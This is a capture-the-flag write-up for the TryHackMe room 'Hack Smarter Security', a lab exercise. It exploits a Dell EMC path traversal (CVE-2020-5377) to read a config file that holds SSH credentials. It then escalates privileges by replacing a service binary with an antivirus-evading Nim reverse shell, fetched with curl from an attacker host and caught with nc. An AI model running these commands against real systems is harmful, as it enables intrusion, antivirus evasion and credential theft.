---
title: THM Hack Smarter Security
author: hanhctf
date: 2024-03-22 20:20:20 +0700
categories: [Write-up, THM]
tags: [CVE-2020-5377]
toc: true
mermaid: true
---

# [**Hack Smarter Security**](https://tryhackme.com/r/room/hacksmartersecurity)

# Summary
>
> - Port 1311 open ==> DellEMC version 9.4.0.2 ==> CVE-2020-5377
> - Use creds login SSH
> - Login SSH, check Privilege Escalation  
> - AV is running ==> using PrivescCheck.ps1
> - Use Nim-Reverse-Shell to bypass AV ==> get root shell  

## NMAP

```text
21/tcp   open     ftp           syn-ack     Microsoft ftpd
22/tcp   open     ssh           syn-ack     OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp   open     http          syn-ack     Microsoft IIS httpd 10.0
1311/tcp open     ssl/rxmon?    syn-ack
3389/tcp open     ms-wbt-server syn-ack     Microsoft Terminal Services
7680/tcp filtered pando-pub     no-response
```

## Web Enumeration

After enumeration port 21,80, nothing interested.  

Continous enumeration port 1311, we can see DellEMC login page.

![](/commons/THM/HackSmarterSecurity/0_loginPage.png)  

Check version of it. I see version 9.4.0.2 ==> "Path Traversal reading files" that is assigned CVE-2020-5377.

![](/commons/THM/HackSmarterSecurity/1_versionVuln.png)  

## Foothold

After searching, found [Github Poc](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py)

Try use this to read C:\Windows\win.ini

```shell
python3 CVE-2020-5377.py 10.2.124.72 10.10.103.144:1311                                                                                                                       1 ⨯
Session: 24CC00FC1B32843B5E21BFB3DDC13C76
VID: C6C8851948623A8B
file > c:\windows\win.ini
Reading contents of c:\windows\win.ini:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Worked.
Try read config file.

```shell
file > c:\inetpub\wwwroot\HackSmarterSec\web.config
Reading contents of c:\inetpub\wwwroot\HackSmarterSec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```

We got a cred.
Use this cred to login SSH

***GOT USER.TXT FLAG***

## Privilege Escalation
  
Try upload Winpeas.exe but detected by AV, can not run Winpeas.

So we use another tool writen in .ps1 to check.
This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).

We can use curl to upload .ps1 to victim via powershell.

Run tools:

```shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

We found a vuln that can be exploit.

![](/commons/THM/HackSmarterSecurity/2_vuln.png)

OK, but AV is running, so we can try to use stealth reverse shell like this

[Nim-Reverse-Shell](https://github.com/Sn1r/Nim-Reverse-Shell)

Just change IP and PORT

```shell
# Change this
  v1 = "IP"
  v2 = "PORT"
```

And compile.

```shell
nim c -d:mingw --app:gui rev_shell.nim
```

Change rev_shell.exe ==> spoofer-scheduler.exe

Stop service is running.

```shell
Stop-Service spoofer-scheduler
```

Next go to destination and upload shell.

```shell
cd "C:\Program Files (x86)\Spoofer\"
curl http://IP:PORT/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

Listen on attacker machine.

```shell
nc -nlvp PORT
```

And finally start the service.

```shell
Start-Service spoofer-scheduler
```

```shell
nc -nlvp 9000
listening on [any] 9000 ...
connect to [IP] from (UNKNOWN) [10.10.103.144] 49918
C:\Windows\system32> 
```

***GOT FLAG***
